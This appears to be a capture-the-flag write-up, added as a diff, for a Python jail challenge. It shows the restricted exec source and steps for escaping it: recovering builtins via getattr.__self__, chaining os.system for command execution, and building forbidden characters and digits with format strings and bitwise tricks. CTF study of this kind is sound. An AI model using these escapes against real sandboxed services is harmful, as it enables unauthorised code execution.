@@ -1,0 +1,86 @@
+* Solution
+
+#+begin_src python
+import ast
+print("Welcome to the jail! You're never gonna escape!")
+payload = input("Enter payload: ") # No uppercase needed
+blacklist = list("abdefghijklmnopqrstuvwxyz1234567890\\;._")
+for i in payload:
+    assert ord(i) >= 32
+    assert ord(i) <= 127
+    assert (payload.count('>') + payload.count('<')) <= 1
+    assert payload.count('=') <= 1
+    assert i not in blacklist
+
+tree = ast.parse(payload)
+for node in ast.walk(tree):
+    if isinstance(node, ast.BinOp):
+        if not isinstance(node.op, ast.Mod): # Modulo because why not?
+            raise ValueError("I don't like math :(")
+exec(payload,{'__builtins__':{},'c':getattr}) # This is enough right?
+print('Bye!')
+#+end_src
+
+As the =Jail.py= said, here we have following restrictions:
+- all lowercase, digits and some of signs are forbidden, except that:
+  ='c' all upcase characters and ()%+:*.,[]=
+
+  #+begin_src python :results output
+    import string
+    blacklist = list("abdefghijklmnopqrstuvwxyz1234567890\\;._")
+    alphabet = string.ascii_letters + string.digits + string.punctuation
+    print(''.join(c for c in alphabet if c not in blacklist))
+  #+end_src
+
+  #+RESULTS:
+  : cABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-/:<=>?@[]^`{|}~
+
+- only one operator < or > and = are allowed
+- only the modulo(%) binary operator is permitted. However, all other operator are allowed like
+  common unary operation
+- there are no =__builtins__= dict, but give =c: getattr=
+  
+** First Exploit
+
+Here we give ~getattr~ with character c, the first thing came into my mind is that we can recover
+=__builtins__= dict by following gadgets:
+
+#+begin_src python
+  getattr.__self__
+#+end_src
+ 
+After that, we can simply chain ~__import__("os").system()~ to execute code. but within the
+restriction this jail. The difficulty is *how to constructing the lowercase string*.
+
+** Lowercase string bypass
+
+Due to the ="%c" %= is allowed so we can leverage the [[https://www.geeksforgeeks.org/python/string-formatting-in-python-using/][Python Modulo Format Strings]] to construct the
+lowercase string.
+
+#+begin_src python :results output
+  print("%c%c%c%c%c" % (104, 101, 108, 108, 111))
+#+end_src
+
+#+RESULTS:
+: hello
+
+Then, we need to bypass the digits restriction next. I was stumbled here during the CTF.
+
+** Digits bypass
+
+There is a trick that Python's boolean type which is a integer internally. And for all integers, we
+have that ~bitwise_not(n) = -n-1 => -bitwise_not(n) = n + 1~
+
+#+begin_src python
+  N = ('A' < 'B')
+  def construct_integer(n: int) -> str:
+      return "-~" * (n - 1) + "N"
+#+end_src
+
+** Learned
+
+1. we can leverage the Object' *magic method* to chain the exploits.
+2. when challenge restrict the input alphabet, we should consider other construction like format string.
+3. the bit operation always helpful, cause they only need =punctuations=.
+
+
